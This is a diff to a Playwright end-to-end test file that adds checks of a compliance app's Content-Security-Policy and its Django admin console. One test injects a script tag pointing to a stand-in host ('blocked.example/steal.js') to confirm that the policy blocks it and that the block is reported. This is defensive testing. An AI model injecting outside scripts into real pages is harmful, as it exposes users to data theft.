@@ -3,7 +3,8 @@
 // administrator cannot read the audit log. The remaining screens are checked for accessibility.
 import { expect, test } from "@playwright/test";
 
-import { expectAccessible, openMenu, recall, storageFor } from "../helpers";
+import { ADMIN, E2E } from "../config.mjs";
+import { expectAccessible, freshCode, openMenu, recall, storageFor } from "../helpers";
 
 test.describe("auditor", () => {
   test.use({ storageState: storageFor("auditor") });
@@ -94,6 +95,68 @@ test.describe("administrator", () => {
     await expect(table.getByText("Laptop left on a train")).toBeVisible();
     await expect(table.getByText("India: CERT-In report")).toBeVisible();
     await expectAccessible(page, "Compliance incidents");
+  });
+
+  test("browser protection: no screen so far was blocked, and injected code is", async ({ page }) => {
+    const response = await page.goto("/compliance");
+    const policy = response!.headers()["content-security-policy"];
+    expect(policy).toContain("script-src 'self';");
+    expect(policy).toContain("report-uri /api/v1/security/browser-reports/");
+    await page.getByRole("tab", { name: "Browser protection" }).click();
+    // Every earlier test ran under the policy, so a blocked script or call on any screen shows here.
+    await expect(page.getByText("Nothing has been blocked.")).toBeVisible();
+    await expect(page.getByText(/HIMS sees your address as/)).toBeVisible();
+    await expectAccessible(page, "Browser protection");
+
+    const ran = await page.evaluate(
+      () =>
+        new Promise<boolean>((resolve) => {
+          document.addEventListener("securitypolicyviolation", () => resolve(false), { once: true });
+          const script = document.createElement("script");
+          script.src = "https://blocked.example/steal.js";
+          script.onload = () => resolve(true);
+          document.head.append(script);
+        }),
+    );
+    expect(ran).toBe(false);
+    await expect(async () => {
+      await page.reload();
+      await page.getByRole("tab", { name: "Browser protection" }).click();
+      const table = page.getByRole("table", { name: "What browsers blocked" });
+      await expect(table.getByText("https://blocked.example")).toBeVisible({ timeout: 2_000 });
+    }).toPass({ timeout: 20_000 });
+    await page.getByRole("button", { name: /^Mark reviewed/ }).click();
+    await expect(page.getByRole("button", { name: /^Mark reviewed/ })).toHaveCount(0);
+  });
+
+  test("admin console works under its browser protection rules", async ({ browser }) => {
+    const context = await browser.newContext();
+    const page = await context.newPage();
+    const blocked: string[] = [];
+    page.on("console", (message) => {
+      if (message.text().includes("Content Security Policy")) blocked.push(message.text());
+    });
+    const missing: string[] = [];
+    page.on("response", (response) => {
+      if (response.url().includes("/static/") && !response.ok()) missing.push(response.url());
+    });
+    const console = `http://127.0.0.1:${E2E.apiPort}/admin/`;
+    const first = await page.goto(console);
+    expect(first!.headers()["content-security-policy"]).toContain("script-src 'self';");
+    await page.getByLabel("Email").fill(ADMIN.email);
+    await page.getByLabel("Password").fill(ADMIN.password);
+    await page.getByLabel("Authenticator code").fill(await freshCode(recall("admin-secret")));
+    await page.getByRole("button", { name: /Log in|Sign in/ }).click();
+    await expect(page).toHaveURL(/\/admin\/$/);
+    for (const path of ["compliance/browsersecurityreport/", "facilities/facility/", "facilities/facility/add/"]) {
+      await page.goto(`${console}${path}`);
+      await expect(page.locator("#content")).toBeVisible();
+    }
+    // The console's own scripts really ran: Django's script sets this up.
+    expect(await page.evaluate(() => "jQuery" in ((window as unknown as { django?: object }).django ?? {}))).toBe(true);
+    expect(missing).toEqual([]);
+    expect(blocked).toEqual([]);
+    await context.close();
   });
 
   test("keyboard only: the menu can be reached and used with Tab and Enter", async ({ page }) => {
